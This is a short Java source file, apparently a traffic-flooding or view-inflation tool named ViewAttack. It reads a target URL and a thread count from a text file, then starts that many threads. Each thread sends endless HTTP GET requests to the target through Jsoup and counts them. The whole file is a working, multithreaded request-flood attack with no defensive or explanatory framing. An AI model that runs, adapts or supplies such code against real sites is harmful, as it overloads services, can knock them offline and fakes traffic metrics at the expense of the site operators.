package Markov;

import org.jsoup.Jsoup;
import org.jsoup.nodes.Document;

import java.awt.*;
import java.io.BufferedReader;
import java.io.FileReader;
import java.io.IOException;

import static Markov.frontPage.*;

public class ViewAttack {
    private static String url = "?";
    public static boolean major = false;
    public static boolean cafemode = false;
    public static void main(String[] args) throws IOException, AWTException {
        System.out.println("Start programme");
        read("target.txt");

        Document doc = Jsoup.connect(url).get();
        System.out.println("URL = " + url);
        System.out.println("Cores = " + cores);
        System.out.println("Connecting to " + doc.title());

        for (int i = 0; i < cores; i++) {
            Thread go = new Thread(() -> attack());
            go.start();
            System.out.println("[Core " + i + "] is online.");
        }
        countdown();
    }

    private static void read(String fileName) {
        // Name + UserInfo + CVList+
        try {
            BufferedReader sc = null;
            sc = new BufferedReader(new FileReader(fileName));
            String temp = sc.readLine();
            interval = Integer.parseInt(temp);
            System.out.println("Interval = " + interval + " seconds.");
            while ((temp = sc.readLine()) != null) {
                String[] entry = temp.split(",");
                url = entry[0];
                cores = Integer.parseInt(entry[1]);
                System.out.println(url + " : " + cores);
            }
            sc.close();
        } catch (IOException e) {
            e.printStackTrace();
        }

    }

    private static void attack() {
        while (true) {
            try {
                Document doc = Jsoup.connect(url).get();
                c++;
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
        //   pList.buildRoot();
    }

}
